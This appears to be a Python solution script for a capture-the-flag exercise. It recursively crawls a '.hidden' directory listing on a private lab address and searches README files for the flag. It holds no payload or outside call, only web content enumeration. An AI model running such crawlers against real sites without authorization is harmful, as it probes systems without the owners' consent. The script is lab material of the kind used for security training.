import requests
from urllib.parse import urljoin

def find_flag_readme(base_url):
    """
    Recursively search through nested directories to find README with flag.
    
    Args:
        base_url (str): Base URL to start searching from
    
    Returns:
        str: URL of README containing flag, or None if not found
    """
    def fetch_directory_contents(url):
        """Fetch directory contents, returning list of links."""
        try:
            response = requests.get(url)
            response.raise_for_status()
            
            links = []
            for line in response.text.split('\n'):
                if 'href="' in line and not 'Parent Directory' in line:
                    link = line.split('href="')[1].split('"')[0]
                    links.append(link)
            
            return links
        except Exception as e:
            print(f"Error fetching {url}: {e}")
            return []

    def recursive_search(current_url, depth=0):
        """Recursively search directories up to 3 levels deep."""
        if depth > 3:
            return None

        try:
            contents = fetch_directory_contents(current_url)
            
            for item in contents:
                full_url = urljoin(current_url, item)
                print(f"Searching {full_url}")
                
                if item.upper() == 'README':
                    readme_response = requests.get(full_url)
                    readme_response.raise_for_status()
                    
                    if 'flag' in readme_response.text:
                        print(f"Flag found in: {full_url}")
                        return full_url
                
                if item.endswith('/'):
                    result = recursive_search(full_url, depth + 1)
                    if result:
                        return result
        
        except Exception as e:
            print(f"Error searching {current_url}: {e}")
        
        return None

    return recursive_search(base_url)

def main():
    base_url = 'http://192.168.0.179/.hidden/'
    flag_readme_url = find_flag_readme(base_url)
    
    if flag_readme_url:
        flag_response = requests.get(flag_readme_url)
        print("Flag contents:", flag_response.text.strip())
    else:
        print("No flag README found.")

if __name__ == "__main__":
    main()